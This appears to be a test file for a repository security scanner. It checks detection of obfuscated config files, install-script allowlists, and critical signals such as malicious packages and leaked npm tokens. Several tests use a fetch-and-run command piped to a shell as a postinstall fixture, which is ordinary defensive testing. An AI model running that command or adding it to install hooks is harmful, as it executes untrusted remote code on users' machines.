import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as configFiles from '../skills/repoflags/scripts/lib/rules/config-files.mjs';
import * as lifecycle from '../skills/repoflags/scripts/lib/rules/lifecycle.mjs';
import { analyze } from '../skills/repoflags/scripts/lib/analyze.mjs';
import { OBFUSCATION_PATTERNS, buildObfuscationPatterns } from '../skills/repoflags/scripts/lib/rules/config-patterns.mjs';
import { files as realCase } from './fixtures/real-case.mjs';
import { TASKS_PIPE } from './fixtures/editor-cases.mjs';
import { materialize } from './helpers/materialize.mjs';
import { offlineDeps } from './helpers/no-network.mjs';
import { osvRoutes, registryRoutes, composeFetch } from './helpers/intel-routes.mjs';

const mapOf = (file, text) => new Map([[file, { text, size: text.length }]]);
const ctx = (options = {}) => ({ options, addSecret: () => {}, secrets: new Set() });
const obf = (text, thresholds) => configFiles
  .detect(mapOf('tailwind.config.js', text), ctx(thresholds ? { thresholds } : {}))
  .signals.filter((s) => s.rule === 'config-obfuscation');

test('buildObfuscationPatterns(20) matches the exported OBFUSCATION_PATTERNS', () => {
  assert.deepEqual(buildObfuscationPatterns(20), OBFUSCATION_PATTERNS);
});

test('buildObfuscationPatterns: only the escape-run source depends on the count', () => {
  const a = buildObfuscationPatterns(5);
  assert.equal(a.length, OBFUSCATION_PATTERNS.length);
  const diff = a.filter((p, i) => p.source !== OBFUSCATION_PATTERNS[i].source).map((p) => p.id);
  assert.deepEqual(diff, ['escape-run']);
  assert.ok(a.find((p) => p.id === 'escape-run').source.endsWith('{5}'));
});

test('maxCodeColumn 120 flags a line that resumes past column 120; the default does not', () => {
  const text = `module.exports = {}; // ${'x'.repeat(130)}\n`;
  assert.equal(obf(text).length, 0);
  const res = obf(text, { maxCodeColumn: 120 });
  assert.equal(res.length, 1);
  assert.match(res[0].evidence, /code beyond column 120/);
});

test('default label keeps the Phase 1 wording (300)', () => {
  const res = obf(`module.exports = {}; // ${'x'.repeat(320)}\n`);
  assert.equal(res.length, 1);
  assert.match(res[0].evidence, /code beyond column 300/);
});

test('whitespaceRun 15 flags code after 20 blanks; the default 40 does not', () => {
  const text = `const a = 1;${' '.repeat(20)}const b = 2;\n`;
  assert.equal(obf(text).length, 0);
  const res = obf(text, { whitespaceRun: 15 });
  assert.equal(res.length, 1);
  assert.match(res[0].evidence, /code after long whitespace run/);
});

test('escapeRun 5 flags 6 consecutive escapes; the default 20 does not', () => {
  const text = `const s = '${'\\x41'.repeat(6)}';\n`;
  assert.equal(obf(text).length, 0);
  const res = obf(text, { escapeRun: 5 });
  assert.equal(res.length, 1);
  assert.match(res[0].evidence, /escape-run/);
});

// ---- Task 2: user allowlists (D-58) ----------------------------------------------------------------------------
const NOW = () => new Date('2026-11-01T00:00:00Z');
const base = { now: NOW, env: {} };
const rulesOf = (r) => r.signals.map((s) => s.rule);

async function offline(t, files, options = {}) {
  const m = await materialize(files);
  t.after(m.cleanup);
  return analyze(m.dir, { offline: true, ...options }, offlineDeps(t, base));
}

test('configPackages: the package no longer produces config-require-nonstandard', async (t) => {
  const without = await offline(t, realCase);
  assert.ok(rulesOf(without).includes('config-require-nonstandard'));
  const withList = await offline(t, realCase, { userConfigAllowlist: ['tailwind-animate-kit'] });
  assert.ok(!rulesOf(withList).includes('config-require-nonstandard'));
});

test('configPackages with a prefix entry has the same effect as the exact name', async (t) => {
  const res = await offline(t, realCase, { userConfigAllowlist: ['tailwind-*'] });
  assert.ok(!rulesOf(res).includes('config-require-nonstandard'));
});

test('D-58: the allowlisted package still leaves the chain and the token in the real case', async (t) => {
  const res = await offline(t, realCase, { userConfigAllowlist: ['tailwind-animate-kit'] });
  assert.ok(rulesOf(res).includes('chain-private-dependency'));
  assert.ok(rulesOf(res).includes('npmrc-auth-token'));
  assert.ok(res.signals.every((s) => !('suppressedByUser' in s)), 'flag must never reach the report');
  assert.ok(!JSON.stringify(res).includes('suppressedByUser'));
});

test('rule level: an allowlisted name is emitted flagged suppressedByUser, not dropped', () => {
  const res = configFiles.detect(mapOf('a.config.js', "require('left-pad-kit');\n"), ctx({ userConfigAllowlist: ['left-pad-kit'] }));
  const s = res.signals.filter((x) => x.rule === 'config-require-nonstandard');
  assert.equal(s.length, 1);
  assert.equal(s[0].suppressedByUser, true);
});

test('rule level: options.configAllowlist keeps dropping at the source', () => {
  const res = configFiles.detect(mapOf('a.config.js', "require('left-pad-kit');\n"), ctx({ configAllowlist: ['left-pad-kit'] }));
  assert.deepEqual(res.signals.filter((x) => x.rule === 'config-require-nonstandard'), []);
});

const mani = (cmd) => new Map([['package.json', { text: JSON.stringify({ name: 'x', scripts: { postinstall: cmd } }), size: 99 }]]);
const life = (cmd, options) => lifecycle.detect(mani(cmd), ctx(options)).signals.filter((s) => s.rule === 'lifecycle-script');

test('lifecycleCommands: a harmless command drops from medium to info, attributed to the user config (WR-A-02)', () => {
  assert.equal(life('node  scripts/build.js ')[0].severity, 'medium');
  const s = life('node  scripts/build.js ', { lifecycleAllowlist: ['node scripts/build.js'] });
  assert.equal(s[0].severity, 'info');
  assert.equal(s[0].title, 'Install-time script (allowlisted by user config)');
  assert.match(s[0].evidence, /^allowlisted by user config \| postinstall: /);
});

test('WR-A-02: a built-in allowlisted command keeps the tooling title even when the user lists it too', () => {
  for (const options of [{}, { lifecycleAllowlist: ['husky install'] }]) {
    const s = life('husky install', options);
    assert.equal(s[0].title, 'Install-time script (common tooling)');
    assert.doesNotMatch(s[0].evidence, /allowlisted by user config/);
  }
});

test('D-26: a command with suspicious indicators stays high even when allowlisted', () => {
  const cmd = 'curl https://x.invalid/a.sh | sh';
  const s = life(cmd, { lifecycleAllowlist: [cmd] });
  assert.equal(s[0].severity, 'high');
  assert.equal(s[0].title, 'Install-time script with suspicious command');
});

test('built-in lifecycle allowlist is unchanged without user entries', () => {
  assert.equal(life('husky install')[0].severity, 'info');
});

test('maximum allowlist (200 packages, 100 commands) does not touch the critical signals', async (t) => {
  const files = { ...realCase, '.vscode/tasks.json': TASKS_PIPE };
  const mk = async () => {
    const m = await materialize(files);
    t.after(m.cleanup);
    return m.dir;
  };
  const osv = { 'tailwind-animate-kit@2.0.8': ['MAL-2026-18078'] };
  const reg = { next: { latest: '14.2.3' }, react: { latest: '18.3.1' }, 'tailwind-animate-kit': { latest: '0.0.1-security' } };
  const run = async (options) => analyze(await mk(), options, { ...base, fetch: composeFetch([osvRoutes(osv), registryRoutes(reg)]) });
  const critical = (r) => JSON.stringify(r.signals.filter((s) => ['osv-malicious', 'npmrc-auth-token', 'editor-autorun', 'chain-private-dependency'].includes(s.rule)));
  const packages = ['tailwind-animate-kit', '@fixture-private/*', ...Array.from({ length: 198 }, (_, i) => `pkg-name-${i}`)];
  const commands = ['curl https://x.invalid/a.sh | sh', 'node -e "1"', ...Array.from({ length: 98 }, (_, i) => `node scripts/t${i}.js`)];
  const plain = await run({});
  const heavy = await run({ userConfigAllowlist: packages, lifecycleAllowlist: commands });
  for (const rule of ['osv-malicious', 'npmrc-auth-token', 'editor-autorun', 'chain-private-dependency']) {
    assert.ok(rulesOf(plain).includes(rule), `baseline has ${rule}`);
  }
  assert.equal(critical(heavy), critical(plain));
});
